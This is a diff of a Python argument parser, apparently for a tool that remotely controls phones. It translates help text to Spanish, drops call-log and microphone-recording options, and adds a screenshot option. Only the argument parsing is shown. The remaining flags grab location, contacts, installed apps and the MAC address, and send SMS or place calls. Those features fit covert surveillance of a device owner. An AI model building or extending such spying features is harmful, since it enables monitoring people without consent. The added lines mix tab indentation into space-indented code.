@@ -15,30 +15,26 @@ class ParseArgs:
     def __init__(self):
         self.parser = argparse.ArgumentParser(description='ACTION')
         self.parser.add_argument('--location', dest='location', action='store_true', default=False,
-                                 help='Get Location')
+                                 help='Obtiene la localizacion')
         self.parser.add_argument('--contacts', dest='contacts', action='store_true', default=False,
-                                 help='Get Contacts')
-        self.parser.add_argument('--calllogs', dest='calllogs', action='store_true', default=False,
-                                 help='Get calllogs')
+                                 help='Obtiene los contactos')
         self.parser.add_argument('--packages', dest='packages', action='store_true', default=False,
-                                 help='Get installed packages')
+                                 help='Obtiene las apps instaladas')
         self.parser.add_argument('--mac', dest='mac', action='store_true', default=False,
-                                 help='Get Mac address')
+                                 help='Obitene mac')
         self.parser.add_argument('--sendsms', dest='sendsms', action='store', metavar=('PhoneNumber', 'Message'),
                                  nargs=2, default=False,
-                                 help='Send SMS')
+                                 help='Envia SMS')
         self.parser.add_argument('--call', dest='call', action='store', metavar=('PhoneNumber', 'calltime'), nargs=2,
                                  default=False,
-                                 help='Call a number for X millisecondes')
-        self.parser.add_argument('--recordmic', dest='recordmic', action='store', metavar=('recordtime'), nargs=1,
-                                 default=False,
-                                 help='Record mic sound for X millisecondes and receive the audio file')
+                                 help='Llama a un numero X milisegundos')
         self.parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', default=False,
                                  help='verbose')
         self.parser.add_argument('-s', '--ssl', dest='ssl', action='store', metavar=('folder'), nargs=1,
                                  default=False,
                                  help='Folder with app.crt and app.key for https')
-        self.args = self.parser.parse_args()
+	self.parser.add_argument('--screenshot', dest='screenshot',action='store_true',default=False,help='Toma captura de pantalla')
+	self.args = self.parser.parse_args()
 
     def getargs(self):
         return self.args
